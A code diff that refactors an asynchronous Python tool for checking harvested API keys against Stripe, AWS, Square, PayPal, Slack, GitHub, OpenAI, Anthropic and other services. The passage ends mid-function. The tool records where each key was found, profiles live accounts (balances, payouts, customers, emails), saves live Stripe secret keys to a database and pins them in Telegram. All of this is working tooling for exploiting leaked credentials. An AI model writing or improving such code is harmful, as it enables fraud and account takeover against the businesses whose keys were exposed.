@@ -187,6 +187,9 @@ class KeyValidator:
         # Semaphore
         self._sem = asyncio.Semaphore(self.concurrent)
 
+        # Shared aiohttp session (lazy-initialised)
+        self._session: Optional[aiohttp.ClientSession] = None
+
         # Validator dispatch
         self._validators: Dict[str, Callable] = {
             "stripe_sk":     self._validate_stripe_secret,
@@ -214,6 +217,24 @@ class KeyValidator:
             "anthropic_key": self._validate_anthropic,
             "shopify_token": self._validate_shopify,
         }
+
+    # ─────────────────────────────────────────────
+    #   SESSION LIFECYCLE
+    # ─────────────────────────────────────────────
+
+    async def _get_session(self) -> aiohttp.ClientSession:
+        """Return the shared session, creating it lazily if needed."""
+        if self._session is None or self._session.closed:
+            self._session = aiohttp.ClientSession(
+                timeout=aiohttp.ClientTimeout(total=self.timeout),
+            )
+        return self._session
+
+    async def close(self):
+        """Close the shared aiohttp session. Safe to call multiple times."""
+        if self._session and not self._session.closed:
+            await self._session.close()
+            self._session = None
 
     # ─────────────────────────────────────────────
     #   PUBLIC API
@@ -341,8 +362,8 @@ class KeyValidator:
                         "source_url": source_url,
                         "time": time.time(),
                     })
-                except Exception:
-                    pass
+                except Exception as e:
+                    logger.debug(f"appending validation result: {e}")
 
             # Persist to stripe_keys table for sk_live keys
             is_live_sk = (
@@ -373,8 +394,8 @@ class KeyValidator:
                             "permissions": json.dumps(result.permissions),
                         },
                     )
-                except Exception:
-                    pass
+                except Exception as e:
+                    logger.debug(f"DB insert for key result: {e}")
 
             # Report
             if self.reporter:
@@ -414,10 +435,10 @@ class KeyValidator:
                     if is_live_sk and msg:
                         try:
                             await self.reporter.pin_message(msg)
-                        except Exception:
-                            pass
-                except Exception:
-                    pass
+                        except Exception as e:
+                            logger.debug(f"pinning Telegram message: {e}")
+                except Exception as e:
+                    logger.debug(f"key validation block: {e}")
 
         return result
 
@@ -463,52 +484,52 @@ class KeyValidator:
         self, result: KeyValidation, extra: Dict
     ):
         """Validate Stripe secret key (sk_live_*)."""
-        async with aiohttp.ClientSession() as session:
-            auth = aiohttp.BasicAuth(result.key_full, "")
-            url = "https://api.stripe.com/v1/balance"
-            async with session.get(
-                url, auth=auth,
-                timeout=aiohttp.ClientTimeout(total=self.timeout),
-            ) as resp:
-                if resp.status == 200:
-                    data = await resp.json()
-                    result.is_live = True
-                    result.confidence = 1.0
-                    # Extract balance info
-                    available = data.get("available", [])
-                    if available:
-                        for bal in available:
-                            currency = bal.get("currency", "")
-                            amount = bal.get("amount", 0)
-                            result.account_info[f"balance_{currency}"] = f"{amount/100:.2f}"
-                    result.permissions = ["balance:read"]
+        session = await self._get_session()
+        auth = aiohttp.BasicAuth(result.key_full, "")
+        url = "https://api.stripe.com/v1/balance"
+        async with session.get(
+            url, auth=auth,
+            timeout=aiohttp.ClientTimeout(total=self.timeout),
+        ) as resp:
+            if resp.status == 200:
+                data = await resp.json()
+                result.is_live = True
+                result.confidence = 1.0
+                # Extract balance info
+                available = data.get("available", [])
+                if available:
+                    for bal in available:
+                        currency = bal.get("currency", "")
+                        amount = bal.get("amount", 0)
+                        result.account_info[f"balance_{currency}"] = f"{amount/100:.2f}"
+                result.permissions = ["balance:read"]
 
-                    # Get account info
-                    try:
-                        async with session.get(
-                            "https://api.stripe.com/v1/account",
-                            auth=auth,
-                            timeout=aiohttp.ClientTimeout(total=self.timeout),
-                        ) as acct_resp:
-                            if acct_resp.status == 200:
-                                acct = await acct_resp.json()
-                                result.account_info["email"] = acct.get("email", "")
-                                result.account_info["business"] = acct.get("business_profile", {}).get("name", "")
-                                result.account_info["country"] = acct.get("country", "")
-                                result.account_info["id"] = acct.get("id", "")
-                                result.permissions.append("account:read")
-                    except Exception:
-                        pass
+                # Get account info
+                try:
+                    async with session.get(
+                        "https://api.stripe.com/v1/account",
+                        auth=auth,
+                        timeout=aiohttp.ClientTimeout(total=self.timeout),
+                    ) as acct_resp:
+                        if acct_resp.status == 200:
+                            acct = await acct_resp.json()
+                            result.account_info["email"] = acct.get("email", "")
+                            result.account_info["business"] = acct.get("business_profile", {}).get("name", "")
+                            result.account_info["country"] = acct.get("country", "")
+                            result.account_info["id"] = acct.get("id", "")
+                            result.permissions.append("account:read")
+                except Exception as e:
+                    logger.debug(f"reading Stripe account info: {e}")
 
-                    # Full recon — only for sk_live_ keys (skip test keys)
-                    if result.key_full.startswith("sk_live_"):
-                        await self._stripe_full_recon(session, auth, result)
+                # Full recon — only for sk_live_ keys (skip test keys)
+                if result.key_full.startswith("sk_live_"):
+                    await self._stripe_full_recon(session, auth, result)
 
-                elif resp.status == 401:
-                    result.is_live = False
-                    result.confidence = 1.0
-                else:
-                    result.error = f"HTTP {resp.status}"
+            elif resp.status == 401:
+                result.is_live = False
+                result.confidence = 1.0
+            else:
+                result.error = f"HTTP {resp.status}"
 
     async def _stripe_full_recon(self, session, auth, result: 'KeyValidation'):
         """Extended Stripe recon: charges, customers, products, subscriptions, payouts."""
@@ -548,8 +569,8 @@ class KeyValidator:
                             result.account_info["recent_payouts"] = " | ".join(recent)
                     elif resp.status == 403:
                         result.account_info[f"{name}_count"] = "restricted"
-            except Exception:
-                pass
+            except Exception as e:
+                logger.debug(f"getting payout/balance data: {e}")
 
     async def _validate_stripe_publishable(
         self, result: KeyValidation, extra: Dict
@@ -561,43 +582,43 @@ class KeyValidator:
         to the Stripe API is generally unsafe" rejection.  An invalid/empty
         token triggers a 400 (valid key) vs 401 (dead key) distinction.
         """
-        async with aiohttp.ClientSession() as session:
-            auth = aiohttp.BasicAuth(result.key_full, "")
+        session = await self._get_session()
+        auth = aiohttp.BasicAuth(result.key_full, "")
 
-            # Strategy: POST to /v1/payment_methods with type=card and a
-            # deliberately invalid token.  Stripe returns:
-            #   401 → key is invalid/revoked
-            #   400 → key is live (request rejected on bad params, not auth)
-            url = "https://api.stripe.com/v1/payment_methods"
-            data = {
-                "type": "card",
-                "card[token]": "tok_invalid_test",
-            }
-            async with session.post(
-                url, data=data, auth=auth,
-                timeout=aiohttp.ClientTimeout(total=self.timeout),
-            ) as resp:
-                body = await resp.json()
-                if resp.status == 401:
-                    # Authentication failed → key is dead
-                    result.is_live = False
-                    result.confidence = 1.0
-                elif resp.status in (400, 402):
-                    # Key authenticated but request was (intentionally) invalid
-                    result.is_live = True
-                    result.confidence = 1.0
-                    result.permissions = ["payment_method:create"]
-                    # Extract merchant account id if returned
-                    err = body.get("error", {})
-                    result.account_info["stripe_error_type"] = err.get("type", "")
-                elif resp.status == 200:
-                    # Shouldn't happen with invalid token, but handle it
-                    result.is_live = True
-                    result.confidence = 1.0
-                    result.permissions = ["payment_method:create"]
-                    result.account_info["pm_id"] = body.get("id", "")
-                else:
-                    result.error = f"HTTP {resp.status}"
+        # Strategy: POST to /v1/payment_methods with type=card and a
+        # deliberately invalid token.  Stripe returns:
+        #   401 → key is invalid/revoked
+        #   400 → key is live (request rejected on bad params, not auth)
+        url = "https://api.stripe.com/v1/payment_methods"
+        data = {
+            "type": "card",
+            "card[token]": "tok_invalid_test",
+        }
+        async with session.post(
+            url, data=data, auth=auth,
+            timeout=aiohttp.ClientTimeout(total=self.timeout),
+        ) as resp:
+            body = await resp.json()
+            if resp.status == 401:
+                # Authentication failed → key is dead
+                result.is_live = False
+                result.confidence = 1.0
+            elif resp.status in (400, 402):
+                # Key authenticated but request was (intentionally) invalid
+                result.is_live = True
+                result.confidence = 1.0
+                result.permissions = ["payment_method:create"]
+                # Extract merchant account id if returned
+                err = body.get("error", {})
+                result.account_info["stripe_error_type"] = err.get("type", "")
+            elif resp.status == 200:
+                # Shouldn't happen with invalid token, but handle it
+                result.is_live = True
+                result.confidence = 1.0
+                result.permissions = ["payment_method:create"]
+                result.account_info["pm_id"] = body.get("id", "")
+            else:
+                result.error = f"HTTP {resp.status}"
 
     async def _validate_stripe_restricted(
         self, result: KeyValidation, extra: Dict
@@ -671,65 +692,65 @@ class KeyValidator:
             "Authorization": auth_header,
         }
 
-        async with aiohttp.ClientSession() as session:
-            async with session.post(
-                endpoint, data=body, headers=headers,
-                timeout=aiohttp.ClientTimeout(total=self.timeout),
-            ) as resp:
-                text = await resp.text()
-                if resp.status == 200 and "<UserId>" in text:
-                    result.is_live = True
+        session = await self._get_session()
+        async with session.post(
+            endpoint, data=body, headers=headers,
+            timeout=aiohttp.ClientTimeout(total=self.timeout),
+        ) as resp:
+            text = await resp.text()
+            if resp.status == 200 and "<UserId>" in text:
+                result.is_live = True
+                result.confidence = 1.0
+                # Parse XML response
+                for tag in ["UserId", "Account", "Arn"]:
+                    m = re.search(rf"<{tag}>(.+?)</{tag}>", text)
+                    if m:
+                        result.account_info[tag.lower()] = m.group(1)
+                result.permissions = ["sts:GetCallerIdentity"]
+            elif resp.status == 403:
+                # 403 with SignatureDoesNotMatch = bad secret
+                # 403 with AccessDenied = valid but no perms (unlikely for STS)
+                if "SignatureDoesNotMatch" in text:
+                    result.is_live = False
                     result.confidence = 1.0
-                    # Parse XML response
-                    for tag in ["UserId", "Account", "Arn"]:
-                        m = re.search(rf"<{tag}>(.+?)</{tag}>", text)
-                        if m:
-                            result.account_info[tag.lower()] = m.group(1)
-                    result.permissions = ["sts:GetCallerIdentity"]
-                elif resp.status == 403:
-                    # 403 with SignatureDoesNotMatch = bad secret
-                    # 403 with AccessDenied = valid but no perms (unlikely for STS)
-                    if "SignatureDoesNotMatch" in text:
-                        result.is_live = False
-                        result.confidence = 1.0
-                    elif "InvalidClientTokenId" in text:
-                        result.is_live = False
-                        result.confidence = 1.0
-                    else:
-                        result.is_live = True  # Valid creds, just restricted
-                        result.confidence = 0.8
+                elif "InvalidClientTokenId" in text:
+                    result.is_live = False
+                    result.confidence = 1.0
                 else:
-                    result.error = f"HTTP {resp.status}"
+                    result.is_live = True  # Valid creds, just restricted
+                    result.confidence = 0.8
+            else:
+                result.error = f"HTTP {resp.status}"
 
     async def _validate_square(
         self, result: KeyValidation, extra: Dict
     ):
         """Validate Square access token."""
-        async with aiohttp.ClientSession() as session:
-            headers = {
-                "Authorization": f"Bearer {result.key_full}",
-                "Square-Version": "2024-01-18",
-            }
-            async with session.get(
-                "https://connect.squareup.com/v2/merchants/me",
-                headers=headers,
-                timeout=aiohttp.ClientTimeout(total=self.timeout),
-            ) as resp:
-                if resp.status == 200:
-                    data = await resp.json()
-                    result.is_live = True
-                    result.confidence = 1.0
-                    merchant = data.get("merchant", [{}])
-                    if isinstance(merchant, list) and merchant:
-                        merchant = merchant[0]
-                    result.account_info["business"] = merchant.get("business_name", "")
-                    result.account_info["country"] = merchant.get("country", "")
-                    result.account_info["id"] = merchant.get("id", "")
-                elif resp.status == 401:
-                    result.is_live = False
-                    result.confidence = 1.0
-                else:
-                    result.error = f"HTTP {resp.status}"
+        session = await self._get_session()
+        headers = {
+            "Authorization": f"Bearer {result.key_full}",
+            "Square-Version": "2024-01-18",
+        }
+        async with session.get(
+            "https://connect.squareup.com/v2/merchants/me",
+            headers=headers,
+            timeout=aiohttp.ClientTimeout(total=self.timeout),
+        ) as resp:
+            if resp.status == 200:
+                data = await resp.json()
+                result.is_live = True
+                result.confidence = 1.0
+                merchant = data.get("merchant", [{}])
+                if isinstance(merchant, list) and merchant:
+                    merchant = merchant[0]
+                result.account_info["business"] = merchant.get("business_name", "")
+                result.account_info["country"] = merchant.get("country", "")
+                result.account_info["id"] = merchant.get("id", "")
+            elif resp.status == 401:
+                result.is_live = False
+                result.confidence = 1.0
+            else:
+                result.error = f"HTTP {resp.status}"
 
     async def _validate_twilio(
         self, result: KeyValidation, extra: Dict
@@ -741,330 +762,330 @@ class KeyValidator:
             result.confidence = 0.3
             return
 
-        async with aiohttp.ClientSession() as session:
-            auth = aiohttp.BasicAuth(result.key_full, auth_token)
-            url = f"https://api.twilio.com/2010-04-01/Accounts/{result.key_full}.json"
-            async with session.get(
-                url, auth=auth,
-                timeout=aiohttp.ClientTimeout(total=self.timeout),
-            ) as resp:
-                if resp.status == 200:
-                    data = await resp.json()
-                    result.is_live = True
-                    result.confidence = 1.0
-                    result.account_info["friendly_name"] = data.get("friendly_name", "")
-                    result.account_info["status"] = data.get("status", "")
-                    result.account_info["type"] = data.get("type", "")
-                elif resp.status == 401:
-                    result.is_live = False
-                    result.confidence = 1.0
-                else:
-                    result.error = f"HTTP {resp.status}"
+        session = await self._get_session()
+        auth = aiohttp.BasicAuth(result.key_full, auth_token)
+        url = f"https://api.twilio.com/2010-04-01/Accounts/{result.key_full}.json"
+        async with session.get(
+            url, auth=auth,
+            timeout=aiohttp.ClientTimeout(total=self.timeout),
+        ) as resp:
+            if resp.status == 200:
+                data = await resp.json()
+                result.is_live = True
+                result.confidence = 1.0
+                result.account_info["friendly_name"] = data.get("friendly_name", "")
+                result.account_info["status"] = data.get("status", "")
+                result.account_info["type"] = data.get("type", "")
+            elif resp.status == 401:
+                result.is_live = False
+                result.confidence = 1.0
+            else:
+                result.error = f"HTTP {resp.status}"
 
     async def _validate_sendgrid(
         self, result: KeyValidation, extra: Dict
     ):
         """Validate SendGrid API key."""
-        async with aiohttp.ClientSession() as session:
-            headers = {"Authorization": f"Bearer {result.key_full}"}
-            async with session.get(
-                "https://api.sendgrid.com/v3/user/profile",
-                headers=headers,
-                timeout=aiohttp.ClientTimeout(total=self.timeout),
-            ) as resp:
-                if resp.status == 200:
-                    data = await resp.json()
-                    result.is_live = True
-                    result.confidence = 1.0
-                    result.account_info["first_name"] = data.get("first_name", "")
-                    result.account_info["last_name"] = data.get("last_name", "")
-                    result.account_info["company"] = data.get("company", "")
-                elif resp.status in (401, 403):
-                    result.is_live = False
-                    result.confidence = 1.0
-                else:
-                    result.error = f"HTTP {resp.status}"
+        session = await self._get_session()
+        headers = {"Authorization": f"Bearer {result.key_full}"}
+        async with session.get(
+            "https://api.sendgrid.com/v3/user/profile",
+            headers=headers,
+            timeout=aiohttp.ClientTimeout(total=self.timeout),
+        ) as resp:
+            if resp.status == 200:
+                data = await resp.json()
+                result.is_live = True
+                result.confidence = 1.0
+                result.account_info["first_name"] = data.get("first_name", "")
+                result.account_info["last_name"] = data.get("last_name", "")
+                result.account_info["company"] = data.get("company", "")
+            elif resp.status in (401, 403):
+                result.is_live = False
+                result.confidence = 1.0
+            else:
+                result.error = f"HTTP {resp.status}"
 
     async def _validate_mailgun(
         self, result: KeyValidation, extra: Dict
     ):
         """Validate Mailgun API key."""
-        async with aiohttp.ClientSession() as session:
-            auth = aiohttp.BasicAuth("api", result.key_full)
-            async with session.get(
-                "https://api.mailgun.net/v3/domains",
-                auth=auth,
-                timeout=aiohttp.ClientTimeout(total=self.timeout),
-            ) as resp:
-                if resp.status == 200:
-                    data = await resp.json()
-                    result.is_live = True
-                    result.confidence = 1.0
-                    domains = data.get("items", [])
-                    result.account_info["domain_count"] = str(len(domains))
-                    if domains:
-                        result.account_info["first_domain"] = domains[0].get("name", "")
-                elif resp.status == 401:
-                    result.is_live = False
-                    result.confidence = 1.0
-                else:
-                    result.error = f"HTTP {resp.status}"
+        session = await self._get_session()
+        auth = aiohttp.BasicAuth("api", result.key_full)
+        async with session.get(
+            "https://api.mailgun.net/v3/domains",
+            auth=auth,
+            timeout=aiohttp.ClientTimeout(total=self.timeout),
+        ) as resp:
+            if resp.status == 200:
+                data = await resp.json()
+                result.is_live = True
+                result.confidence = 1.0
+                domains = data.get("items", [])
+                result.account_info["domain_count"] = str(len(domains))
+                if domains:
+                    result.account_info["first_domain"] = domains[0].get("name", "")
+            elif resp.status == 401:
+                result.is_live = False
+                result.confidence = 1.0
+            else:
+                result.error = f"HTTP {resp.status}"
 
     async def _validate_slack(
         self, result: KeyValidation, extra: Dict
     ):
         """Validate Slack bot/user token."""
-        async with aiohttp.ClientSession() as session:
-            async with session.post(
-                "https://slack.com/api/auth.test",
-                headers={"Authorization": f"Bearer {result.key_full}"},
-                timeout=aiohttp.ClientTimeout(total=self.timeout),
-            ) as resp:
-                if resp.status == 200:
-                    data = await resp.json()
-                    if data.get("ok"):
-                        result.is_live = True
-                        result.confidence = 1.0
-                        result.account_info["team"] = data.get("team", "")
-                        result.account_info["user"] = data.get("user", "")
-                        result.account_info["team_id"] = data.get("team_id", "")
-                        result.account_info["url"] = data.get("url", "")
-                    else:
-                        result.is_live = False
-                        result.confidence = 1.0
-                        result.error = data.get("error", "")
+        session = await self._get_session()
+        async with session.post(
+            "https://slack.com/api/auth.test",
+            headers={"Authorization": f"Bearer {result.key_full}"},
+            timeout=aiohttp.ClientTimeout(total=self.timeout),
+        ) as resp:
+            if resp.status == 200:
+                data = await resp.json()
+                if data.get("ok"):
+                    result.is_live = True
+                    result.confidence = 1.0
+                    result.account_info["team"] = data.get("team", "")
+                    result.account_info["user"] = data.get("user", "")
+                    result.account_info["team_id"] = data.get("team_id", "")
+                    result.account_info["url"] = data.get("url", "")
                 else:
-                    result.error = f"HTTP {resp.status}"
+                    result.is_live = False
+                    result.confidence = 1.0
+                    result.error = data.get("error", "")
+            else:
+                result.error = f"HTTP {resp.status}"
 
     async def _validate_github(
         self, result: KeyValidation, extra: Dict
     ):
         """Validate GitHub personal access token."""
-        async with aiohttp.ClientSession() as session:
-            headers = {
-                "Authorization": f"token {result.key_full}",
-                "Accept": "application/vnd.github.v3+json",
-            }
-            async with session.get(
-                "https://api.github.com/user",
-                headers=headers,
-                timeout=aiohttp.ClientTimeout(total=self.timeout),
-            ) as resp:
-                if resp.status == 200:
-                    data = await resp.json()
-                    result.is_live = True
-                    result.confidence = 1.0
-                    result.account_info["login"] = data.get("login", "")
-                    result.account_info["name"] = data.get("name", "")
-                    result.account_info["email"] = data.get("email", "")
-                    result.account_info["repos"] = str(data.get("public_repos", 0))
-                    # Check scopes
-                    scopes = resp.headers.get("X-OAuth-Scopes", "")
-                    result.permissions = [s.strip() for s in scopes.split(",") if s.strip()]
-                elif resp.status == 401:
-                    result.is_live = False
-                    result.confidence = 1.0
-                else:
-                    result.error = f"HTTP {resp.status}"
+        session = await self._get_session()
+        headers = {
+            "Authorization": f"token {result.key_full}",
+            "Accept": "application/vnd.github.v3+json",
+        }
+        async with session.get(
+            "https://api.github.com/user",
+            headers=headers,
+            timeout=aiohttp.ClientTimeout(total=self.timeout),
+        ) as resp:
+            if resp.status == 200:
+                data = await resp.json()
+                result.is_live = True
+                result.confidence = 1.0
+                result.account_info["login"] = data.get("login", "")
+                result.account_info["name"] = data.get("name", "")
+                result.account_info["email"] = data.get("email", "")
+                result.account_info["repos"] = str(data.get("public_repos", 0))
+                # Check scopes
+                scopes = resp.headers.get("X-OAuth-Scopes", "")
+                result.permissions = [s.strip() for s in scopes.split(",") if s.strip()]
+            elif resp.status == 401:
+                result.is_live = False
+                result.confidence = 1.0
+            else:
+                result.error = f"HTTP {resp.status}"
 
     async def _validate_google_api(
         self, result: KeyValidation, extra: Dict
     ):
         """Validate Google API key (via Maps geocode — free tier)."""
-        async with aiohttp.ClientSession() as session:
-            url = (
-                f"https://maps.googleapis.com/maps/api/geocode/json"
-                f"?address=1600+Amphitheatre+Parkway&key={result.key_full}"
-            )
-            async with session.get(
-                url, timeout=aiohttp.ClientTimeout(total=self.timeout),
-            ) as resp:
-                if resp.status == 200:
-                    data = await resp.json()
-                    status = data.get("status", "")
-                    if status == "OK":
+        session = await self._get_session()
+        url = (
+            f"https://maps.googleapis.com/maps/api/geocode/json"
+            f"?address=1600+Amphitheatre+Parkway&key={result.key_full}"
+        )
+        async with session.get(
+            url, timeout=aiohttp.ClientTimeout(total=self.timeout),
+        ) as resp:
+            if resp.status == 200:
+                data = await resp.json()
+                status = data.get("status", "")
+                if status == "OK":
+                    result.is_live = True
+                    result.confidence = 1.0
+                    result.permissions = ["geocoding"]
+                elif status == "REQUEST_DENIED":
+                    # Key exists but geocoding not enabled — still valid key
+                    error_msg = data.get("error_message", "")
+                    if "not authorized" in error_msg.lower():
                         result.is_live = True
-                        result.confidence = 1.0
-                        result.permissions = ["geocoding"]
-                    elif status == "REQUEST_DENIED":
-                        # Key exists but geocoding not enabled — still valid key
-                        error_msg = data.get("error_message", "")
-                        if "not authorized" in error_msg.lower():
-                            result.is_live = True
-                            result.confidence = 0.7
-                            result.account_info["note"] = "Key valid but API not enabled"
-                        else:
-                            result.is_live = False
-                            result.confidence = 0.8
-                    elif status == "OVER_QUERY_LIMIT":
-                        result.is_live = True
-                        result.confidence = 0.9
-                        result.account_info["note"] = "Rate limited — key is active"
-                else:
-                    result.error = f"HTTP {resp.status}"
+                        result.confidence = 0.7
+                        result.account_info["note"] = "Key valid but API not enabled"
+                    else:
+                        result.is_live = False
+                        result.confidence = 0.8
+                elif status == "OVER_QUERY_LIMIT":
+                    result.is_live = True
+                    result.confidence = 0.9
+                    result.account_info["note"] = "Rate limited — key is active"
+            else:
+                result.error = f"HTTP {resp.status}"
 
     async def _validate_telegram(
         self, result: KeyValidation, extra: Dict
     ):
         """Validate Telegram Bot token."""
-        async with aiohttp.ClientSession() as session:
-            url = f"https://api.telegram.org/bot{result.key_full}/getMe"
-            async with session.get(
-                url, timeout=aiohttp.ClientTimeout(total=self.timeout),
-            ) as resp:
-                if resp.status == 200:
-                    data = await resp.json()
-                    if data.get("ok"):
-                        bot = data.get("result", {})
-                        result.is_live = True
-                        result.confidence = 1.0
-                        result.account_info["bot_name"] = bot.get("first_name", "")
-                        result.account_info["username"] = bot.get("username", "")
-                        result.account_info["bot_id"] = str(bot.get("id", ""))
-                elif resp.status == 401:
-                    result.is_live = False
+        session = await self._get_session()
+        url = f"https://api.telegram.org/bot{result.key_full}/getMe"
+        async with session.get(
+            url, timeout=aiohttp.ClientTimeout(total=self.timeout),
+        ) as resp:
+            if resp.status == 200:
+                data = await resp.json()
+                if data.get("ok"):
+                    bot = data.get("result", {})
+                    result.is_live = True
                     result.confidence = 1.0
-                else:
-                    result.error = f"HTTP {resp.status}"
+                    result.account_info["bot_name"] = bot.get("first_name", "")
+                    result.account_info["username"] = bot.get("username", "")
+                    result.account_info["bot_id"] = str(bot.get("id", ""))
+            elif resp.status == 401:
+                result.is_live = False
+                result.confidence = 1.0
+            else:
+                result.error = f"HTTP {resp.status}"
 
     async def _validate_discord(
         self, result: KeyValidation, extra: Dict
     ):
         """Validate Discord Bot token."""
-        async with aiohttp.ClientSession() as session:
-            headers = {"Authorization": f"Bot {result.key_full}"}
-            async with session.get(
-                "https://discord.com/api/v10/users/@me",
-                headers=headers,
-                timeout=aiohttp.ClientTimeout(total=self.timeout),
-            ) as resp:
-                if resp.status == 200:
-                    data = await resp.json()
-                    result.is_live = True
-                    result.confidence = 1.0
-                    result.account_info["username"] = data.get("username", "")
-                    result.account_info["id"] = data.get("id", "")
-                    result.account_info["bot"] = str(data.get("bot", False))
-                elif resp.status == 401:
-                    result.is_live = False
-                    result.confidence = 1.0
-                else:
-                    result.error = f"HTTP {resp.status}"
+        session = await self._get_session()
+        headers = {"Authorization": f"Bot {result.key_full}"}
+        async with session.get(
+            "https://discord.com/api/v10/users/@me",
+            headers=headers,
+            timeout=aiohttp.ClientTimeout(total=self.timeout),
+        ) as resp:
+            if resp.status == 200:
+                data = await resp.json()
+                result.is_live = True
+                result.confidence = 1.0
+                result.account_info["username"] = data.get("username", "")
+                result.account_info["id"] = data.get("id", "")
+                result.account_info["bot"] = str(data.get("bot", False))
+            elif resp.status == 401:
+                result.is_live = False
+                result.confidence = 1.0
+            else:
+                result.error = f"HTTP {resp.status}"
 
     async def _validate_paypal(
         self, result: KeyValidation, extra: Dict
     ):
         """Validate PayPal Client ID via OAuth2 token endpoint."""
         # PayPal needs both client_id and secret — we can only check if client_id gets a response
-        async with aiohttp.ClientSession() as session:
-            # Try to get an OAuth2 token (will fail without secret, but 401 vs 400 tells us if ID is real)
-            auth = aiohttp.BasicAuth(result.key_full, "dummy_secret_for_probe")
-            async with session.post(
-                "https://api-m.paypal.com/v1/oauth2/token",
-                data={"grant_type": "client_credentials"},
-                auth=auth,
-                timeout=aiohttp.ClientTimeout(total=self.timeout),
-            ) as resp:
-                if resp.status == 200:
-                    # Somehow got a token — secret was valid too
-                    data = await resp.json()
-                    result.is_live = True
-                    result.confidence = 1.0
-                    result.account_info["scope"] = data.get("scope", "")[:200]
-                    result.account_info["app_id"] = data.get("app_id", "")
-                elif resp.status == 401:
-                    # 401 = client_id exists but wrong secret — still useful info
-                    result.is_live = True  # Client ID is valid
-                    result.confidence = 0.7
-                    result.account_info["note"] = "Client ID valid, secret needed"
-                else:
-                    result.is_live = False
-                    result.confidence = 0.8
+        session = await self._get_session()
+        # Try to get an OAuth2 token (will fail without secret, but 401 vs 400 tells us if ID is real)
+        auth = aiohttp.BasicAuth(result.key_full, "dummy_secret_for_probe")
+        async with session.post(
+            "https://api-m.paypal.com/v1/oauth2/token",
+            data={"grant_type": "client_credentials"},
+            auth=auth,
+            timeout=aiohttp.ClientTimeout(total=self.timeout),
+        ) as resp:
+            if resp.status == 200:
+                # Somehow got a token — secret was valid too
+                data = await resp.json()
+                result.is_live = True
+                result.confidence = 1.0
+                result.account_info["scope"] = data.get("scope", "")[:200]
+                result.account_info["app_id"] = data.get("app_id", "")
+            elif resp.status == 401:
+                # 401 = client_id exists but wrong secret — still useful info
+                result.is_live = True  # Client ID is valid
+                result.confidence = 0.7
+                result.account_info["note"] = "Client ID valid, secret needed"
+            else:
+                result.is_live = False
+                result.confidence = 0.8
 
     async def _validate_razorpay(
         self, result: KeyValidation, extra: Dict
     ):
         """Validate Razorpay key via payments endpoint."""
-        async with aiohttp.ClientSession() as session:
-            auth = aiohttp.BasicAuth(result.key_full, "")
-            async with session.get(
-                "https://api.razorpay.com/v1/payments?count=1",
-                auth=auth,
-                timeout=aiohttp.ClientTimeout(total=self.timeout),
-            ) as resp:
-                if resp.status == 200:
-                    data = await resp.json()
-                    result.is_live = True
-                    result.confidence = 1.0
-                    items = data.get("items", [])
-                    result.account_info["payments_count"] = str(data.get("count", 0))
-                    if items:
-                        result.account_info["last_payment"] = str(items[0].get("amount", 0))
-                        result.account_info["currency"] = items[0].get("currency", "")
-                elif resp.status == 401:
-                    result.is_live = False
-                    result.confidence = 1.0
-                else:
-                    result.error = f"HTTP {resp.status}"
+        session = await self._get_session()
+        auth = aiohttp.BasicAuth(result.key_full, "")
+        async with session.get(
+            "https://api.razorpay.com/v1/payments?count=1",
+            auth=auth,
+            timeout=aiohttp.ClientTimeout(total=self.timeout),
+        ) as resp:
+            if resp.status == 200:
+                data = await resp.json()
+                result.is_live = True
+                result.confidence = 1.0
+                items = data.get("items", [])
+                result.account_info["payments_count"] = str(data.get("count", 0))
+                if items:
+                    result.account_info["last_payment"] = str(items[0].get("amount", 0))
+                    result.account_info["currency"] = items[0].get("currency", "")
+            elif resp.status == 401:
+                result.is_live = False
+                result.confidence = 1.0
+            else:
+                result.error = f"HTTP {resp.status}"
 
     async def _validate_openai(
         self, result: KeyValidation, extra: Dict
     ):
         """Validate OpenAI API key via models endpoint."""
-        async with aiohttp.ClientSession() as session:
-            headers = {"Authorization": f"Bearer {result.key_full}"}
-            async with session.get(
-                "https://api.openai.com/v1/models",
-                headers=headers,
-                timeout=aiohttp.ClientTimeout(total=self.timeout),
-            ) as resp:
-                if resp.status == 200:
-                    data = await resp.json()
-                    result.is_live = True
-                    result.confidence = 1.0
-                    models = data.get("data", [])
-                    result.account_info["models_count"] = str(len(models))
-                    gpt4 = any("gpt-4" in m.get("id", "") for m in models)
-                    result.account_info["has_gpt4"] = str(gpt4)
-                elif resp.status == 401:
-                    result.is_live = False
-                    result.confidence = 1.0
-                elif resp.status == 429:
-                    result.is_live = True
-                    result.confidence = 0.9
-                    result.account_info["note"] = "Rate limited but key is valid"
-                else:
-                    result.error = f"HTTP {resp.status}"
+        session = await self._get_session()
+        headers = {"Authorization": f"Bearer {result.key_full}"}
+        async with session.get(
+            "https://api.openai.com/v1/models",
+            headers=headers,
+            timeout=aiohttp.ClientTimeout(total=self.timeout),
+        ) as resp:
+            if resp.status == 200:
+                data = await resp.json()
+                result.is_live = True
+                result.confidence = 1.0
+                models = data.get("data", [])
+                result.account_info["models_count"] = str(len(models))
+                gpt4 = any("gpt-4" in m.get("id", "") for m in models)
+                result.account_info["has_gpt4"] = str(gpt4)
+            elif resp.status == 401:
+                result.is_live = False
+                result.confidence = 1.0
+            elif resp.status == 429:
+                result.is_live = True
+                result.confidence = 0.9
+                result.account_info["note"] = "Rate limited but key is valid"
+            else:
+                result.error = f"HTTP {resp.status}"
 
     async def _validate_anthropic(
         self, result: KeyValidation, extra: Dict
     ):
         """Validate Anthropic API key via models endpoint."""
-        async with aiohttp.ClientSession() as session:
-            headers = {
-                "x-api-key": result.key_full,
-                "anthropic-version": "2023-06-01",
-            }
-            async with session.get(
-                "https://api.anthropic.com/v1/models",
-                headers=headers,
-                timeout=aiohttp.ClientTimeout(total=self.timeout),
-            ) as resp:
-                if resp.status == 200:
-                    result.is_live = True
-                    result.confidence = 1.0
-                    data = await resp.json()
-                    models = data.get("data", [])
-                    result.account_info["models_count"] = str(len(models))
-                elif resp.status == 401:
-                    result.is_live = False
-                    result.confidence = 1.0
-                elif resp.status == 429:
-                    result.is_live = True
-                    result.confidence = 0.9
-                    result.account_info["note"] = "Rate limited but key is valid"
-                else:
-                    result.error = f"HTTP {resp.status}"
+        session = await self._get_session()
+        headers = {
+            "x-api-key": result.key_full,
+            "anthropic-version": "2023-06-01",
+        }
+        async with session.get(
+            "https://api.anthropic.com/v1/models",
+            headers=headers,
+            timeout=aiohttp.ClientTimeout(total=self.timeout),
+        ) as resp:
+            if resp.status == 200:
+                result.is_live = True
+                result.confidence = 1.0
+                data = await resp.json()
+                models = data.get("data", [])
+                result.account_info["models_count"] = str(len(models))
+            elif resp.status == 401:
+                result.is_live = False
+                result.confidence = 1.0
+            elif resp.status == 429:
+                result.is_live = True
